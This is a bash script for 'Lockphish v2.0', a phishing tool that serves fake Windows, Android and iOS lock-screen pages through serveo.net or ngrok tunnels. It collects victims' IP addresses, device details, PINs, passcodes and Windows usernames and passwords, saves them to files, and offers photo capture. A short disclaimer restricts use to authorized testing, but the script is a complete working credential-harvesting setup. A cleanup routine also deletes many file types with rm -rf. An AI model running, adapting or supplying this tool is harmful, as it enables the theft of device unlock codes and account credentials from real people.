#!/bin/bash
# Lockphish v2.0
# Coded by: github.com/kali-linux-tutorial/lockphish 
# Twitter: twitter.com/kalilinux_in
# https://www.kalilinux.in
# Read the License before using any part from this code.

trap 'printf "\n";stop' 2

banner() {
    printf "\e[1;33m    __            _    \e[0m\e[1;77m      _     _     _      \e[0m\n"
    printf "\e[1;33m   / /  ___   ___| | __\e[0m\e[1;77m_ __ | |__ (_)___| |__   \e[0m\n"
    printf "\e[1;33m  / /  / _ \ / __| |/ /\e[0m\e[1;77m '_ \| '_ \| / __| '_ \  \e[0m\n"
    printf "\e[1;33m / /__| (_) | (__|   <|\e[0m\e[1;77m |_) | | | | \__ \ | | | \e[0m\n"
    printf "\e[1;33m \____/\___/ \___|_|\_\ \e[0m\e[1;77m.__/|_| |_|_|___/_| |_| By Kali\e[0m\n"
    printf "\e[1;77m                      |_|                  \e[0m\e[1;33mv2.0\e[0m\n"
    printf " \n\e[1;77m coded by: github.com/kali-linux-tutorial/lockphish\e[0m \n"
    printf " \e[1;77mTwitter: twitter.com/kalilinux_in\e[1;77m\e[0m"
    printf "\n\n\n\e[1;91m Disclaimer: this tool is designed for security\n"
    printf " testing in an authorized simulated cyberattack\n"
    printf " Attacking targets without prior mutual consent\n"
    printf " is illegal! by Kali\e[0m\n"
    printf "\n"
}

stop() {
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    if [[ $checkngrok == *'ngrok'* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
    fi

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi
    exit 1
}

dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    device=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | tr -d ";")
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Device:\e[0m\e[1;77m %s\e[0m\n" $device
    cat ip.txt >> saved.ip.txt
}

checkfound() {
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
    while [ true ]; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
            catch_ip
            rm -rf ip.txt
        fi

        sleep 0.5

        if [[ -e "pin.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Android PIN received!\e[0m\n"
            pin=$(tail -n1 pin.txt)
            printf "\e[1;92m[\e[0m+\e[1;92m] PIN:\e[0m\e[1;77m %s\e[0m\n" $pin
            printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m pin.saved.txt\e[0m\n"
            cat pin.txt >> pin.saved.txt
            rm -rf pin.txt
        fi

        if [[ -e "passwords.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Win credentials received!\e[0m\n"
            username=$(tail -n1 usernames.txt)
            password=$(tail -n1 passwords.txt)
            printf "\e[1;92m[\e[0m+\e[1;92m] Username:\e[0m\e[1;77m %s\e[0m\n" $username
            printf "\e[1;92m[\e[0m+\e[1;92m] Password:\e[0m\e[1;77m %s\e[0m\n" $password
            printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m win.saved.txt\e[0m\n"
            cat usernames.txt >> win.saved.txt
            cat passwords.txt >> win.saved.txt
            rm -rf usernames.txt
            rm -rf passwords.txt
        fi

        if [[ -e "passcode.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] IOS passcode received!\e[0m\n"
            passcode=$(tail -n1 passcode.txt)
            printf "\e[1;92m[\e[0m+\e[1;92m] Passcode:\e[0m\e[1;77m  %s\e[0m\n" $passcode
            printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m  passcode.txt\e[0m\n"
            cat passcode.txt >> passcode.saved.txt
            rm -rf passcode.txt
        fi

        sleep 0.5
    done
}

server() {
    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi

    if [[ $subdomain_resp == true ]]; then
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
        sleep 8
    else
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
        sleep 8
    fi
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 3
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
}

payload_ngrok() {
    url=$redirect
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    payload_name="index"
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building webpages\e[0m\n"
    sed 's+forwarding_url+'$url'+g' post.php > cat.php
    sed 's+forwarding_link+'$link'+g' win.html | sed 's+forwarding_url+'$url'+g' > win2.html
    sed 's+forwarding_link+'$link'+g' phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
    sed 's+forwarding_link+'$link'+g' droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html

    IFS=$'\n'
    data_base64=$(base64 -w 0 win2.html)
    temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

    sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g ' > index2.html

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    printf "\e[1;92m[\e[0m+\e[1;33m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
}

ngrok_server() {
    if [[ -e ngrok ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
        php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
        sleep 2
        printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
        ngrok_process=$(ngrok http 8080)
        link=$(echo "$ngrok_process" | grep -o "https://[0-9a-z]*\.ngrok.io")

        if [[ -z $link ]]; then
            echo -e "\e[1;93m[!] Ngrok failed to provide a forwarding link. Please install Ngrok manually from https://ngrok.com/download\e[0m"
            exit 1
        fi

        printf "\e[1;92m[\e[0m+\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
        sleep 10
        payload_ngrok
        checkfound
    else
        echo -e "\e[1;93m[!] Ngrok not found! Please install Ngrok manually from https://ngrok.com/download\e[0m"
        exit 1
    fi
}

start1() {
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi

    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
    default_option_server="1"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
    option_server="${option_server:-${default_option_server}}"
    if [[ $option_server -eq 1 ]]; then
        command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
        start
    elif [[ $option_server -eq 2 ]]; then
        ngrok_server
    else
        printf "\e[1;93m [!] Invalid option!\e[0m\n"
        sleep 1
        clear
        start1
    fi
}

payload() {
    link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf "\e[1;92m[\e[0m+\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
    checkfound
}

check() {
    if [[ -e ip.txt ]]; then
        rm -rf ip.txt
    fi

    if [[ -e passcode.txt ]]; then
        rm -rf passcode.txt
    fi

    if [[ -e pin.txt ]]; then
        rm -rf pin.txt
    fi

    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi

    if [[ -e index.html ]]; then
        rm -rf index.html
    fi

    if [[ -e capture.jpg ]]; then
        rm -rf capture.jpg
    fi

    if [[ -e captured.jpg ]]; then
        rm -rf captured.jpg
    fi

    if [[ -e passwords.txt ]]; then
        rm -rf passwords.txt
    fi

    if [[ -e usernames.txt ]]; then
        rm -rf usernames.txt
    fi

    if [[ -e *.zip ]]; then
        rm -rf *.zip
    fi

    if [[ -e *.xml ]]; then
        rm -rf *.xml
    fi

    if [[ -e *.json ]]; then
        rm -rf *.json
    fi

    if [[ -e *.log ]]; then
        rm -rf *.log
    fi

    if [[ -e *.html ]]; then
        rm -rf *.html
    fi

    if [[ -e *.php ]]; then
        rm -rf *.php
    fi

    if [[ -e *.png ]]; then
        rm -rf *.png
    fi

    if [[ -e *.jpg ]]; then
        rm -rf *.jpg
    fi

    if [[ -e *.jpeg ]]; then
        rm -rf *.jpeg
    fi

    if [[ -e *.gif ]]; then
        rm -rf *.gif
    fi

    if [[ -e *.txt ]]; then
        rm -rf *.txt
    fi

    if [[ -e *.json ]]; then
        rm -rf *.json
    fi

    if [[ -e *.zip ]]; then
        rm -rf *.zip
    fi

    if [[ -e *.rar ]]; then
        rm -rf *.rar
    fi

    if [[ -e *.tar.gz ]]; then
        rm -rf *.tar.gz
    fi
}

banner
dependencies
check

default_option="1"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template (\e[0m\e[1;77mDefault\e[0m\e[1;92m: \e[0m' option_template
option_template="${option_template:-${default_option}}"

if [[ $option_template -eq 1 ]]; then
    template="template.php"
elif [[ $option_template -eq 2 ]]; then
    template="template2.php"
else
    template="template.php"
fi

printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Use a custom template? (\e[0m\e[1;77my\e[0m\e[1;92m/\e[0m\e[1;77mn\e[0m\e[1;92m): \e[0m"
read -r custom_template
if [[ "$custom_template" == "y" || "$custom_template" == "Y" ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter the path of your custom template: \e[0m"
    read -r custom_template_path
    if [[ -e $custom_template_path ]]; then
        template=$(cat "$custom_template_path")
        printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Custom template loaded successfully!\e[0m\n"
    else
        printf "\e[1;93m[!] File not found. Using the default template.\e[0m\n"
    fi
fi

printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Use custom redirect URL? (\e[0m\e[1;77my\e[0m\e[1;92m/\e[0m\e[1;77mn\e[0m\e[1;92m): \e[0m"
read -r custom_redirect
if [[ "$custom_redirect" == "y" || "$custom_redirect" == "Y" ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter the custom redirect URL: \e[0m"
    read -r custom_redirect_url
    redirect="$custom_redirect_url"
else
    redirect="http://www.google.com"
fi

default_option_capture="n"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Capture photos (\e[0m\e[1;77my\e[0m\e[1;92m/\e[0m\e[1;77mn\e[0m\e[1;92m): \e[0m' option_capture
option_capture="${option_capture:-${default_option_capture}}"
if [[ "$option_capture" == "y" || "$option_capture" == "Y" ]]; then
    capture="yes"
else
    capture="no"
fi

default_option_capture_time="2"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Capture interval (\e[0m\e[1;77min seconds, default: 2s\e[0m\e[1;92m): \e[0m' option_capture_time
option_capture_time="${option_capture_time:-${default_option_capture_time}}"

default_option_subdomain="n"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Use a custom subdomain (\e[0m\e[1;77my\e[0m\e[1;92m/\e[0m\e[1;77mn\e[0m\e[1;92m): \e[0m' option_subdomain
option_subdomain="${option_subdomain:-${default_option_subdomain}}"
if [[ "$option_subdomain" == "y" || "$option_subdomain" == "Y" ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter the custom subdomain: \e[0m"
    read -r subdomain
    subdomain_resp=true
fi

clear

start1
